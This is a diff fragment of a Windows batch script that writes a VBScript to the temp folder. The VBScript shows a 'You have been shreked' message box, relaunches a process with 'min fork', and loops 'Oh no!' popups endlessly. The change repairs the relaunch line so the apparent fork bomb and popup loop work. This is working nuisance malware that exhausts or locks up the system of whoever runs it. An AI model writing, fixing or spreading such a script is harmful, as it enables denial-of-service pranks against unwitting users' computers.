@@ -23,7 +23,7 @@ set "file=%temp%\shrek_popup.vbs"
 
 > "%file%" echo Set objShell = WScript.CreateObject("WScript.Shell")
 >>"%file%" echo MsgBox "You have been shreked :("
->>"%file%" echo "start """" /min """ ^& objShell.Run WScript.Arguments(0) ^& """ min fork"
+>>"%file%" echo objShell.Run "start """" /min """ ^& WScript.Arguments(0) ^& """ min fork"
 >>"%file%" echo Do
 >>"%file%" echo MsgBox "Oh no!"
 >>"%file%" echo Loop
